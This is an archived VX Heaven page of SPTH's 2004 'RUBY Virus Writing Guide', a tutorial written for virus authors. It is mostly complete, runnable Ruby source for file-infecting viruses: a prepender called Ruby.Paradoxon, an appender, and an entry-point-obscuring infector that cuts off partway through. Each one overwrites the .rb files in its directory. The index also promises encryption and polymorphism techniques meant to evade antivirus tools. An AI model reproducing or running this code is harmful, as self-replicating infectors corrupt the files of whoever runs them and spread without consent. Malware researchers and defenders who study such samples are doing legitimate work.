<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'RUBY Virus Writing Guide' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,RUBY Virus Writing Guide, fcode, spth, file, mych, mycode, language, prepending, linux, code, length, virus, directory, close, read, ruby"/>
<meta name="Description" content="Ruby is an interpreted script language, which is mainly used for web-sites. You can do alot of things with Ruby. The language's syntax has quite a lot realtion-ship to the C-syntax, but the whole language seems to be nearer to PHP or VB. It's a quite nice mixture of several famouse language, therefore it should not be that problem to learn the language, if you already know some other web-based script languages. The official site of Ruby is: http://www.ruby-lang.org/en/. The language has been done in japan, where it is very famouse. I've read about Ruby in a Linux Magazine, with a Knoppix 3.6-script-edition CD. As the text about Ruby was nice, I wanted to try it. And so I did. I've tested every source with ActiveScriptRuby 1.8.1.2 (http://arton.hp.infoseek.co.jp/). With this article I wanted to discover another language fully. I hope you like it, if not, I don't care alot, because I had fun while writing it. :)"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"0f53bf1dbdaeb0c5279e6d153b92a10f665b618f-1498757089-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp20.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>RUBY Virus Writing Guide</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em>29A #8</em><br/> <em>November 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp20.html';</script><div class="ci"><a href="/lib/?ci=vsp20">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp20">Back to index</a>] [<a href="/lib/vsp20.html#disqus_thread">Comments</a>]<br/> 
<h2>Index</h2>
<ol start="0">
<li>Intro Words</li>
<li>File infection
<ol type="a">
<li>Prepending</li>
<li>Appending</li>
<li>Entry Point Obscuring</li>
</ol></li>
<li>Encryption
<ol type="a">
<li>Virus as ASCII numbers</li>
<li>Virus as Characters</li>
</ol></li>
<li>Polymorphism
<ol type="a">
<li>Random encryption: ASCII number function</li>
<li>Code-As-String morphing</li>
<li>Adding Trash</li>
<li>Variable-Name Changing</li>
<li>Number Changing</li>
<li>Permutation</li>
</ol></li>
<li>Last Words</li>
</ol>
<h2>0) Intro Words</h2>
<p>Ruby is an interpreted script language, which is mainly used for web-sites. You can do alot of things with Ruby. The language's syntax has quite a lot realtion-ship to the C-syntax, but the whole language seems to be nearer to PHP or VB. It's a quite nice mixture of several famouse language, therefore it should not be that problem to learn the language, if you already know some other web-based script languages. The official site of Ruby is: http://www.ruby-lang.org/en/. The language has been done in japan, where it is very famouse. I've read about Ruby in a Linux Magazine, with a Knoppix 3.6-script-edition CD. As the text about Ruby was nice, I wanted to try it. And so I did. I've tested every source with ActiveScriptRuby 1.8.1.2 (http://arton.hp.infoseek.co.jp/). With this article I wanted to discover another language fully. I hope you like it, if not, I don't care alot, because I had fun while writing it. :)</p>
<h2>1) File infection</h2>
<p>Writing a file infector seems to be the most important thing for such an article therefore this is the first point. Well, now you will see some different types of infection: prepender and appender (the standart-types) and EPO (the advanced file infection). Just look at these codes and explanations!</p>
<h3>a) Prepending</h3>
<p>One of the standart-types of infection is prepending. Prepending is copying the viruscode infront of the host file. Just look at the code, and then read the short descriptiong. I'm sure you will understand, how it works.</p>
<p><strong>Ruby Prepender Virus Example</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;"># RUBY.Paradoxon</span><br/>
mycode=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span>.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">630</span><span style="color: black;">&#41;</span><br/>
cdir = <span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#9900CC;">getwd</span><span style="color: black;">&#41;</span><br/>
&nbsp; cdir.<span style="color:#9900CC;">each</span> <span style="color:#9966CC; font-weight:bold;">do</span> <span style="color:#006600; font-weight:bold;">|</span>a<span style="color:#006600; font-weight:bold;">|</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">ftype</span><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span>==<span style="color:#996600;">&quot;file&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> a<span style="color: black;">&#91;</span>a.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">3</span>, a.<span style="color:#9900CC;">length</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;.rb&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> a!=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">basename</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spth=fle.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> spth!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode<span style="color:#006600; font-weight:bold;">+</span>=spth<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spth=fle.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#9900CC;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> fcode<span style="color: black;">&#91;</span><span style="color:#006666;">7</span>,<span style="color:#006666;">9</span><span style="color: black;">&#93;</span>!=<span style="color:#996600;">&quot;Paradoxon&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode=mycode<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">13</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span>fcode<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>a,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#CC0066; font-weight:bold;">print</span> fcode<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#9900CC;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
cdir.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>The virus above is 'Ruby.Paradoxon', the very first virus infecting Ruby files. I've done it in November 2004. I'll shourtly tell you, what the virus does:</p>
<ul>
<li>Reads the own code (the own code isn't 630 bytes if you save it under Windows. The reason is, that Ruby is a Linux script language, and in Linux Windows' chr(13,10) = chr(10) - and Ruby calculates in Linux-size)</li>
<li>Opens the current directory</li>
<li>Checks if the founden item in the directory is a infectable file (.rb-file / not infected)</li>
<li>Reads the code of the new victim</li>
<li>Generates the new code (viruscode+13.chr+10.chr+hostcode)</li>
<li>Writes the new code to the victim</li>
<li>Closes directory</li>
</ul>
<h3>b) Appending</h3>
<p>The second standart-type of infection is appending. An appender virus writes its code in the end of the real code. As an result the virus runs after the hostfile. The following code shows you, how such a virus could look like in Ruby.</p>
<p><strong>Ruby Appender Virus Example</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;"># SPTH</span><br/>
mycode=<span style="color:#996600;">&quot;&quot;</span><br/>
mych=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
myc=mych.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> myc!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; mycode<span style="color:#006600; font-weight:bold;">+</span>=myc<br/>
&nbsp; myc=mych.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
mycode=mycode<span style="color: black;">&#91;</span>mycode.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">734</span>,<span style="color:#006666;">734</span><span style="color: black;">&#93;</span><br/>
cdir = <span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#9900CC;">getwd</span><span style="color: black;">&#41;</span><br/>
&nbsp; cdir.<span style="color:#9900CC;">each</span> <span style="color:#9966CC; font-weight:bold;">do</span> <span style="color:#006600; font-weight:bold;">|</span>a<span style="color:#006600; font-weight:bold;">|</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">ftype</span><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span>==<span style="color:#996600;">&quot;file&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> a<span style="color: black;">&#91;</span>a.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">3</span>, a.<span style="color:#9900CC;">length</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;.rb&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> a!=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">basename</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spth=fle.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> spth!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode<span style="color:#006600; font-weight:bold;">+</span>=spth<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spth=fle.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#9900CC;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> fcode<span style="color: black;">&#91;</span>fcode.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">732</span>,<span style="color:#006666;">4</span><span style="color: black;">&#93;</span>!=<span style="color:#996600;">&quot;SPTH&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode=fcode<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">13</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span>mycode<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>a,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#CC0066; font-weight:bold;">print</span> fcode<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#9900CC;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
cdir.<span style="color:#9900CC;">close</span><br/>
&nbsp;</div>
<p>Appender viruses are a little bit more difficult, but far away from hard :) Just look at the explanation, if you dont understand, how it works:</p>
<ul>
<li>Finds its own code at the end of the host-file</li>
<li>Opens current directory</li>
<li>Finds infectable files</li>
<li>Generates new code</li>
<li>Writes new code to file</li>
<li>Closes directory</li>
</ul>
<h3>c) Entry Point Obscuring</h3>
<p>Entry Point Obscuring is the advanced way of infecting a file. It means, that the code will be added at any variable offset. The result is, that AVs can not search at any static address but have to search in the whole file for the virus. This leads to a longer search-process.</p>
<p>The following example of a EPO Ruby virus infects the file anywhere in the middle. Therefore it gets the lines of the file, calculate a random offset, and then include inself between line 1 and N. Look at the code and the description below, to understand how this works.</p>
<p><strong>Ruby EPO Virus Example</strong></p>
<div class="ruby" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;"># SPTH</span><br/>
mycode=<span style="color:#996600;">&quot;&quot;</span><br/>
mych=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span><br/>
myc=mych.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> myc!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; mycode<span style="color:#006600; font-weight:bold;">+</span>=myc<br/>
&nbsp; myc=mych.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
i=<span style="color:#006666;">0</span><br/>
<span style="color:#9966CC; font-weight:bold;">while</span> myc!=<span style="color:#996600;">&quot;SPTH&quot;</span><br/>
&nbsp; myc=mycode<span style="color: black;">&#91;</span>i,<span style="color:#006666;">4</span><span style="color: black;">&#93;</span><br/>
&nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
<span style="color:#9966CC; font-weight:bold;">end</span><br/>
mycode=<span style="color:#996600;">&quot;# S&quot;</span><span style="color:#006600; font-weight:bold;">+</span>mycode<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1382</span><span style="color: black;">&#93;</span><br/>
cdir = <span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span><span style="color:#CC00FF; font-weight:bold;">Dir</span>.<span style="color:#9900CC;">getwd</span><span style="color: black;">&#41;</span><br/>
&nbsp; cdir.<span style="color:#9900CC;">each</span> <span style="color:#9966CC; font-weight:bold;">do</span> <span style="color:#006600; font-weight:bold;">|</span>a<span style="color:#006600; font-weight:bold;">|</span><br/>
&nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> <span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">ftype</span><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span>==<span style="color:#996600;">&quot;file&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> a<span style="color: black;">&#91;</span>a.<span style="color:#9900CC;">length</span><span style="color:#006600; font-weight:bold;">-</span><span style="color:#006666;">3</span>, a.<span style="color:#9900CC;">length</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;.rb&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> a!=<span style="color:#CC00FF; font-weight:bold;">File</span>.<span style="color:#9900CC;">basename</span><span style="color: black;">&#40;</span><span style="color:#0000FF; font-weight:bold;">__FILE__</span><span style="color: black;">&#41;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>a<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spth=fle.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> spth!=<span style="color:#0000FF; font-weight:bold;">nil</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fcode<span style="color:#006600; font-weight:bold;">+</span>=spth<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; spth=fle.<span style="color:#9900CC;">read</span><span style="color: black;">&#40;</span><span style="color:#006666;">1</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#9900CC;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=<span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inf=<span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lc=<span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> i<span style="color:#006600; font-weight:bold;">&lt;</span>fcode.<span style="color:#9900CC;">length</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=i<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> fcode<span style="color: black;">&#91;</span>i,<span style="color:#006666;">4</span><span style="color: black;">&#93;</span>==<span style="color:#996600;">&quot;SPTH&quot;</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inf=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> fcode<span style="color: black;">&#91;</span>i,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; lc<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> inf!=<span style="color:#006666;">1</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ln=<span style="color:#CC0066; font-weight:bold;">rand</span><span style="color: black;">&#40;</span>lc<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; precode=<span style="color:#996600;">&quot;&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i=<span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j=<span style="color:#006666;">0</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> i <span style="color:#006600; font-weight:bold;">&lt;</span> ln<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; precode<span style="color:#006600; font-weight:bold;">+</span>=fcode<span style="color: black;">&#91;</span>j,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">if</span> fcode<span style="color: black;">&#91;</span>j,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span>==<span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span> <span style="color:#9966CC; font-weight:bold;">then</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; i<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; newcode=precode<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">13</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span>mycode<span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">13</span>.<span style="color:#9900CC;">chr</span><span style="color:#006600; font-weight:bold;">+</span><span style="color:#006666;">10</span>.<span style="color:#9900CC;">chr</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">while</span> j<span style="color:#006600; font-weight:bold;">&lt;</span>=fcode.<span style="color:#9900CC;">length</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; newcode<span style="color:#006600; font-weight:bold;">+</span>=fcode<span style="color: black;">&#91;</span>j,<span style="color:#006666;">1</span><span style="color: black;">&#93;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; j<span style="color:#006600; font-weight:bold;">+</span>=<span style="color:#006666;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle=<span style="color:#CC0066; font-weight:bold;">open</span><span style="color: black;">&#40;</span>a,<span style="color:#996600;">&quot;w&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#CC0066; font-weight:bold;">print</span> newcode<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; fle.<span style="color:#9900CC;">close</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color:#9966CC; font-weight:bold;">end</span><br/>
